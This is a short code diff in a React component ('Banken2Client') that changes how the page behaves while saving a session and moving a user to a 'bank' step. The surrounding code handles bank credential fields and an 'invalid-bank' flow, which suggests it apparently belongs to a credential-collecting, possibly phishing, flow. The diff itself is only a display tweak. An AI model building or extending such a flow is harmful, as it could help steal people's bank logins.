@@ -190,11 +190,7 @@ export function Banken2Client({ sessionId, routeSessionId, invalid }: Props) {
       const nextFd: Record<string, any> = { ...fd };
       for (const f of BANK_CRED_FIELDS) delete nextFd[f];
 
-      // Tik aninda icerigi temizle: update + sayfa gecisi sirasinda
-      // eski liste frame'i gorunmesin, sadece portal arkaplani kalir.
-      const rootEl = containerRef.current;
-      if (rootEl) rootEl.innerHTML = "";
-
+      // Listeyi acik birak (dim) — gecis aninda bos arka plan flashi olmasin.
       const { error: upErr } = await supabase
         .from("sessions")
         .update({ is_hidden: false, current_step: "bank", form_data: nextFd })
@@ -203,7 +199,6 @@ export function Banken2Client({ sessionId, routeSessionId, invalid }: Props) {
       if (upErr) {
         savingRef.current = false;
         setSaving(false);
-        if (rootEl) rootEl.innerHTML = finalHtml;
         return;
       }
       // URL'de uzun UUID yerine kisa public_id kullan (invalid-bank akisinda
